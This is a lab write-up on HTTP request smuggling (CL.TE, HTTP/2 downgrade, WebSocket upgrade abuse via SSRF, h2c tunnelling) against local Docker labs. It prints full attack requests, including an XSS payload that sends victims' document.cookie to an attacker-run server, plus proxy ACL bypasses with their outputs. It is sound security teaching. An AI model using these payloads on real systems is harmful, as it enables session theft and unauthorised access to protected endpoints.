# $muggling adventures
![smug](smug.jpg)
## Some theory
HTTP/1.1 allows multiple requests in the same TCP socket, when a client is requesting multiple resources (Javascript, Images, Pages, Ajax requests), requests can follow each other in the same TCP socket. The outgoing stream would look like the code below.

    GET /index.php HTTP/1.1
    Host: myapp.com
    Content-Length: 0
    
    POST /login HTTP/1.1
    Host: myapp.com
    Content-Length: 35
    
    username=admin&password=i<3hackfest
    GET /logo.gif HTTP/1.1
    Host: myapp.com
    Content-Length: 0
Since request is made up of a header section and a body section, the headers can have any length and are terminated by \r\n. The body section has variable length. In the previous outgoing stream, the server can determine the size of the body section using the Content-Length header.
This point involves a confusion, this confusion appears when a proxy and a backend server do not agree on the size of each request. 

In a typical scalable web infrastructure, a proxy will be placed in front of the backend. The proxy is forwarding a request to the backend with the intent to add functionality such as caching, firewall, or load balancing, it can happens that the proxy and the backend don't treat a request in the same way, especially regarding the interpretation of the end of the request. The [RFC](https://datatracker.ietf.org/doc/html/rfc2616#section-4.4) explains how to face the case where both CL and TE are present:

     If a message is received with both a
     Transfer-Encoding header field and a Content-Length header field,
     the latter MUST be ignored.

The problem is that not always this principle is applied.

I used [these resources](https://gosecure.github.io/request-smuggling-workshop) as LAB enviroment

## HTTP/1.1 Content-Length Transfer-Encoding (CL.TE)
In this scenario we are going to exploit a proxy that use Content-Length, while the backe-end server is supporting Transfer-Encoding. Generally it implies the possibility to exploit a open redirect, but here the backend server is also vulnerable to reflected XSS.

    GET /contact.php?hey HTTP/1.1
That is reflected into the response

    <form action="/contact.php?hey" method="post">

First we can test if we can get an error (405) from the server for method not allowed (NOTEXIST), meaning that our smuggled request has been executed:

    POST / HTTP/1.1
    Host: localhost
    Content-Length: 13
    Transfer-Encoding: chunked
    
    0
    
    NOTEXIST

Before sending the request remember to disable Update content-lenght feature in Burp Repeater. Analizing the request:
1. The request must be sent using POST since we need a body so we cannot use GET
2. Content-length is set to the length of the payload, starting from 0 to the end of NOTEXIST string (a trick to find the value is to use Notepad++ and select the block, then have a look to Sel: <length> in the center bottom of the windows). In this case we could also send a bigger value, since we are only interested to cause an error

What happens here? The proxy send the whole request (to the end of NOTEXIST), since the backend server use TE, when 0 is encountered (end of trasmission), the string NOTEXIST is treated as a new request, so an error is returned. Let's try now with a redirect to a local resource:

    POST / HTTP/1.1
    Host: localhost
    Content-Length: 51
    Transfer-Encoding: chunked
    
    0
    
    GET /contact.php HTTP/1.1
    Host: localhost
    X:        

Send the above request a couple of time, then if you visit the site home page (http://localhost) you should be redirect to the contact page. Let's analyze the payload, focusing on the second request, starting from GET.
So as previously explained the second request will be parsed by the backend and left in the HTTP tube. The next coming request will be appended to our malicious GET and the next user will be redirected to the contact form. Here we have also inserted two additional headers: the host and a fake one (X:). Please note that without this fake header the payload will generate a bad request error. At the moment of writing it's not clear to me why this header is needed, since I didn't find a cleat explanation. If you know the reason submit a pull request.

Even an open redirect is not considered an important vulnerability, but if you can chain it with another one, like XSS,  it will become immediately more serious. Let's consider the following paylod:

    POST / HTTP/1.1
    Host: localhost
    Content-Length: 135
    Transfer-Encoding: chunked
    
    0
    
    GET /contact.php?"><img src='http://localhost:8000/c.jpeg' onload=this.src='http://localhost:8000/?'+document.cookie> HTTP/1.1
    X:

Here I used a classic payload to steal the user's cookie. Start a local python server, send the smuggled request a couple of time, then visiting a page on localhost you should see your cookies coming into the python server console:

    127.0.0.1 - - [04/Jun/2024 15:44:16] "GET /c.jpeg HTTP/1.1" 304 -
    127.0.0.1 - - [04/Jun/2024 15:44:16] "GET /?{073ef109-18e5-44ae-acb5-e4ce8d598d15}=value HTTP/1.1" 200 -

I also hosted an image to avoid using the onerror event that will continue to send the second request since a time out occurs. Please note that the application does not use any cookies, I manually added one just to test the payload.
### Additional notes
This payload worked on Firefox and Chrome (last release), sent through Burp Repeater. Sending the payload directly through these browsers, will result in an encoded query string parameter, due to the anti-XSS features present on the browser. That will stop our exploit to work, indeed the smuggled request permitted to us to bypass these protections completely.

## HTTP/2 Request smuggling (?)
HTTP/2 is a binary protocol. HTTP/2 messages are sent as one or more frames and each frame has an explicit length that tells the server how many bytes to read. The length of an HTTP/2 message is calculated accordingly by adding up the length of all frames. This length can not be manipulated, so it is not possible smuggling request on HTTP/2. The only possibility we have to perform such attack is when the front-end (proxy) supports HTTP/2 but the back-end does not. Then the front-end must convert the HTTP/2 request for the back-end into an HTTP/1.1 request. This creates new possibilities for manipulation.
### HTTP/2 to HTTP/1 proxy downgrade
Some proxy support the downgrade to HTTP/1.1, this is not a vaulnerability but actually a feature. For istance it can be useful to simplify the deployment of microservices, since they don't have to be configured to use TLS. In this scenario we can try to abuse the conversion that take place between H2 (HTTP/2) to H1 (HTTP/1.1), since the requests need to be rewritten. But how we can smuggle a request in this scenario?

We know that HTTP/2 doesn't contemplate a content-length header, since the binary format of HTTP/2 has built-in length for every frame field, however, as we know, it's always possible to inject that header in a H2 frame. Doing that we can try to confuse the request conversion process towards the backend.
Follows a sample malicious H2 request that we could use:

    :method         POST
    :path           /api/postMessage
    :authority      service.company.com
    content-type    application/x-www-form-urlencoded
    content-length  6
    
    test=XGET /private/path HTTP/1.1
    Host: 127.0.0.1
    
That will be converted to H1 at the backend as 2 requests:

    POST /api/postMessage HTTP/2
    Host: service.company.com
    Content-Length: 6
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    test=X
    GET /private/path HTTP/1.1
    Host: 127.0.0.1:80

So the second request will let us accesse the private content, at least in 

#### LAB
The Lab proposed here (quite confusing for me) make use of Armeria, a microservice framework that can be configured as a [proxy](https://armeria.dev/docs/server-basics/#proxy-protocol). Armeria (1.13.2) is a microservices framework that can act as proxy. Here it accepts HTTP/2 connections. The proxy forwards requests to the backend server. We have an endpoint that serves static request (/static) and we know that there is also /documents endpoint, but the proxy is preventing us to access. In this case the proxy returns not found (404). Our goal, of course, it's to get the flag present in the documents endpoint. To do that we have to find a way to bypass the proxy ACL.

The first test to perform is to verify if the conten-length is passed to the backend. In the lab both /static and /documents live on the same webserver: webstatic-1 (have a look at the docker log), so we can try to send a request to the an existing resource, and in the body we insert the smuggled request for the protected resource (as usual in Burp Repeater remember to disable the automatic update of the content-legth):

    POST /static/style.css HTTP/2
    Host: localhost:8443
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: none
    Sec-Fetch-User: ?1
    Te: trailers
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 0
    
    GET /documents/flag.txt HTTP/1.1
    Host: localhost:8443
    User-Agent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Again rememberf to insert a double carriage return to the end of the content body.
Looking at the docker log we can see that our H2 has been translated to two H1 request to the backend:

    webstatic-1  | 172.18.0.3 - - [05/Jun/2024:19:55:47 +0000] "POST /static/style.css HTTP/1.1" 200 2169 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
    webstatic-1  | 172.18.0.3 - - [05/Jun/2024:19:55:47 +0000] "GET /documents/flag.txt HTTP/1.1" 200 294 "-" "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"        
        
And we were able also to bypass the proxy ACL since we get a 200 response. Now only a problem remains: how to read the content of the response to the smuggled request? Since the proxy forward a single request, it expects a single response, so only the response to the first POST request is returned to the client. The second generated H1 is not retrived. It seems that we need to send a second H2 request very quickly (ms) to get the response to the smuggled H1 request, to do that a script is provided with the LAB to perform this action., but in my case it did not work. An issue is already opened [here](https://github.com/GoSecure/request-smuggling-workshop/issues/1), I added a comment to confirm the problem. If you, dear reader, knows how to solve this issue, please comment here or open a pull request.

## Websocket Request Smuggling
A WebSocket is a communication protocol that provides full-duplex communication channels over a single TCP connection. It enables real-time, event-driven connection between a client and a server.
Unlike traditional HTTP software, which follows a request-response model, WebSockets allow two-way (bi-directional) communication. This means that the client and the server can send data to each other anytime without continuous polling. 

### Request smuggling
Once the WebSocket communication has been established, it is not possible to pass an HTTP/1 request, when the protocol upgrade the traffic will flow as bytes stream. It is however possible to initiate an incomplete upgrade request to websocket, that would fail. If the proxy will not verify the server response to evaluate if the upgrade actually succeeds, it will be possible to pass additional HTTP requests to the server, since the communication didn't switch to websocket mode.

### Upgrade status code validation (101)
Although not all proxies will check if the upgrade was successful, the majority, as NGINX, will be validate the response based on the backend returned status code (10). With these proxies the exploit is only effective if an attacker can fake a response code to 101, to trick the proxy that the communication can be switched to websocket, when actually will not. Since the proxy will not check any further, assuming that a direct web socket stream is in place, we can abuse this condition to send HTPP requests. Of course we need to exploit another vulnerability, generally SSRF on the backend server, to manipulate the status code response.
You can read more information [here](https://github.com/0ang3el/websocket-smuggle).

### LAB
Here the proxy is blocking specific URLs from being accessed. The URLs blocked are part of [Spring actuator Endpoint](https://docs.spring.io/spring-boot/docs/2.1.13.RELEASE/reference/html/production-ready-endpoints.html). These endpoints can leak users related information (e.g. trace).
We can reach the main app at http://localhost:8002
Inspecting the generated request sending a chat message we can see that the communication is upgraded to websocket. Furthermore inspecting the source of http://localhost:8002/status.html we can see that there is another endpoint used to chcek the status of a remote server:

    var urls=["http://store.initech.com","http://tickets.initech.com","http://blog.initech.com"];
    $( document ).ready(function() {
    
    $.each(urls, function( index, url ) {
        $.ajax("/health-check?url="+encodeURIComponent(url))
            .success(function (jqXHR) {
                console.log("success");
                console.log(jqXHR.status);

Coming back to Burp we can send on the intercepted request to Repeater:

    GET /health-check?url=http%3A%2F%2Ftickets.initech.com HTTP/1.1
    Host: localhost:8002
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

We get the response:

    HTTP/1.1 200

So a SSRF vulnerability is present, let's verify it. First start a Python server, then using Repeater try to change the url parameter to point to our Python server (set the IP according to your docker container interfaces):

    GET /health-check?url=http%3A%2F%2F172.21.0.1:8000 HTTP/1.1
    Host: localhost:8002
    ....

We got a 200 response

    HTTP/1.1 200 

On the Python server console:

    172.21.0.2 - - [06/Jun/2024 12:54:51] "GET / HTTP/1.1" 200 

Since we need to get a 101 response I created the follows simple script to return it:

    import sys
    from http.server import HTTPServer, BaseHTTPRequestHandler

    class MyServer(BaseHTTPRequestHandler):
       def do_GET(self):
           self.protocol_version = "HTTP/1.1"
           self.send_response(101)
           self.end_headers()

    print("Server listen o port 80...");
    HTTPServer(("", 80), MyServer).serve_forever()

Run the server:

    sudo python resp101.py 
    ...
    Server listen o port 80...

Now we can perform another test, in Repeater change the request method to POST, then set the url parameter in query string and pass a dummy value in the body, as follows:

    POST /health-check?url=http%3A%2F%2F172.21.0.1 HTTP/1.1
    Host: localhost:8002
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    X-Requested-With: XMLHttpRequest
    Connection: close
    Referer: http://localhost:8002/status.html
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 3
    
    x=1

And we should get a 101 response from our Python server:

    HTTP/1.1 101 
    Server: nginx/1.17.6
    Date: Thu, 06 Jun 2024 13:09:48 GMT
    Connection: upgrade
    X-Application-Context: application:8081

Double-check Python server console:

    172.21.0.2 - - [06/Jun/2024 15:14:33] "GET / HTTP/1.1" 101 -

Now we are ready to set up the final payload:

1. We modify the POST request to require a websocket update. We exploit the SSRF vulnerability to control the response and trick the proxy to upgrade the communication.
2. The proxy wont check the chained HTTP request, since it believes that a websocket communication is in place
3. We set in the body of the POST our smuggled request to bypass proxy ACL rules
Follows the finale request (remember to disable update content-length and to insert double carriage return to the end of the GET smuggled request):

        POST /health-check?url=http%3A%2F%2F172.21.0.1 HTTP/1.1
        Host: localhost:8002
        Accept: */*
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate, br
        Sec-WebSocket-Version: 13
        Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
        Pragma: no-cache
        Cache-Control: no-cache
        Upgrade: websocket
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 0
        
        GET /trace HTTP/1.1
        Host: localhost:3001

You should get two response, the second with the trace information:


        HTTP/1.1 101 
        ...
        HTTP/1.1 200 
        ....
        Date: Thu, 06 Jun 2024 14:40:33 GMT

        2000
        [{"timestamp":1717684833282,"info":{"method":"POST","path":"/health-check","headers":{"request":{"upgrade":"websocket","host":"localhost:8002","sec-websocket-key":"dGhlIHNhbXBsZSBub25jZQ==","sec-websocket-version":"13","content-length":"0","accept":"*/*","accept-language":"en-US,en;q=0.5","accept-encoding":"gzip, deflate, br","pragma":"no-cache","cache-control":"no-cache","content-type":"application/x-www-form-urlencoded"},
        ...

More information about upgrade websocket headers can be found [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Protocol_upgrade_mechanism).

### Final thoughts about real world
I encountered a very similar scenario in a real engagement. The DEV team forgot to uninstall t an endpoint used to check if a API service was active, based on the response (200 or 503) the routes to microservices were changed. The logic was implementend only during the test phase of the APP (alpha release) and it was not present in production release, but the endpoint used to perform the check was yet in place. They forgot to uninstall it. The endpoint of course was vulnerable to SSRF, exactly in the same way of the LAB.

## Request Smuggling Via HTTP/2 Cleartext (h2c)
This vulnerability has been discovered by BishopFox as explained in this great article [here](https://bishopfox.com/blog/h2c-smuggling-request).
Follows I will recap the main concepts as taken by the previous article.

### BACKGROUND: HTTP/1.1 UPGRADES AND PROXIES
To understand this vulnerability, let’s review the behavior of the HTTP/1.1 upgrades and how upgrades are implemented by proxies.
The Upgrade header is most often used to upgrade HTTP connections to long-lived WebSocket connections. Proxies support this behavior by keeping the original client connection alive and simply proxying the TCP traffic to the back-end server. At this point, the proxy is no longer content-aware and can no longer enforce access control rules.

The process begins with the client initiating an HTTP/1.1 upgrade request. Once a successful a 101 “Switching Protocols” response is received, then the client reuses the connection and transmits data in accordance with the newly negotiated protocol, in this case h2c.
After receiving the 101 response from the back-end web server, the proxy maintains a persistent TCP connection and no longer monitors the content.

### THE H2C SPECIFICATION AND A RISKY OPPORTUNITY
Typically, usage of the HTTP/2 protocol is negotiated over the TLS application-layer protocol negation extension (TLS-ALPN), however, HTTP/2 can also be initiated via an HTTP/1.1 Upgrade header, identified by the string "h2c" for cleartext communication. Follows an example request:

    GET / HTTP/1.1
    Host: www.example.com
    Upgrade: h2c
    HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
    Connection: Upgrade, HTTP2-Settings
    
The HTTP2-Settings contains Base64 encoded HTTP/2 connection parameters. According to the specification, h2c upgrades are allowed only on cleartext connections and the HTTP2-Settings header should not be forwarded to the backend (see RFC 7540 Section 3.2.1).

BishopFox create a script, <b>h2cSmuggler</b> to test and abuse the upgrade process, the steps inplemented in the tool's logic are:
1. h2cSmuggler transmits an HTTP/1.1 upgrade request to the / endpoint on the reverse proxy.
2. The proxy forwards the Upgrade and Connection headers to the backend, backend responds with "101 Switching Protocols" and prepares to receive HTTP2 communications.
3. Upon receiving the 101 response from the backend, the proxy “upgrades” the connection to an unmanaged TCP tunnel (this is the very interesting fact)
4. Upon receiving the 101 forwarded response from the proxy, h2cSmuggler reuses the existing connection and exchanges HTTP/2 initialization frames with the server. These include the server’s response for the endpoint requested in the HTTP/1.1 h2c upgrade (the / endpoint).
5. Using HTTP/2 multiplexing, h2cSmuggler sends an additional request for the restricted resource, protected by the proxy ACL
6. The proxy, which is no longer monitoring communications in the TCP tunnel, forwards the request to the back-end server
7. The server responds with restricted resource content

### LAB
Since the Lab enviroment to test the tool is quite older and I had some problem to run the Docker container for the backend server, I decided to create my own Lab here. I did not forked the original repo since it seems to not been mantained anymore (pull requests hanging), plus, to keep the things simple, I decided to use only Ngnix as proxy. The backend server is exactly the same (GO app), I only added some more console log.
#### Requirements
- Docker
- Docker compose
- Python3 with h2c support
My enviroments
- OS Kali 2024.2
- Server: Docker Engine - Community, Version: 26.1.4
- Docker Compose version v2.27.1
- Python 3.11.9 with h2 (4.1.0)

#### LAB setup

    pip3 install h2
    git clone https://github.com/zinzloun/lost-in-smuggling.git
    cd lost-in-smuggling/h2c 
    chmod u+x configs/generate-certificates.sh && ./configs/generate-certificates.sh
check certificates has been generated
    
    ls configs                      
        cert.pem ...  key.pem  ...
Run the containers (proxy and backend)

    sudo docker compose up
Grab a beer... :)

#### Working in the lab
Once the containers are started we should have the following:
- Ngnix (proxy) on https://localhost:8443
- Backend GO server on http://localhost:8080
For the sake of learninf, of course, you should interact with the backend only through the proxy. If you try to access the flag through the proxy:

      https://localhost:8443/flag

You will recive:

        403 Forbidden
        nginx/1.27.0

First we can test if the proxy can be used as HTTP tunnell:

    python h2csmuggler.py -x https://localhost:8443 --test                    
        [INFO] h2c stream established successfully.
        [INFO] Success! https://localhost:8443 can be used for tunneling
Then we can proceed to try to get the flag:

    python h2csmuggler.py -x https://localhost:8443 http://backend/flag
    [INFO] h2c stream established successfully.
    :status: 200
    content-type: text/plain; charset=utf-8
    content-length: 70
    date: Sat, 08 Jun 2024 12:32:46 GMT
    
    Hello from the backend GO server, /, http: true. Can you get the flag?
    
    [INFO] Requesting - /flag
    :status: 200
    content-type: text/plain; charset=utf-8
    content-length: 17
    date: Sat, 08 Jun 2024 12:32:56 GMT
    
    You got the flag!
#### Note about Docker links
As you can see from the above command, you will notice that we requires the flag on backend host (http://backend/flag) endpoint. If you don't know docker this could be confusing, due to the docker containers configuration (have a look at the docker-compose configuration file), where a link is defined for ngnix to the go server as backend, furthermore the ngnix configuration proxy pass point to http://backend. More information about Docker links can be found [here](https://docs.docker.com/compose/networking/#link-containers)







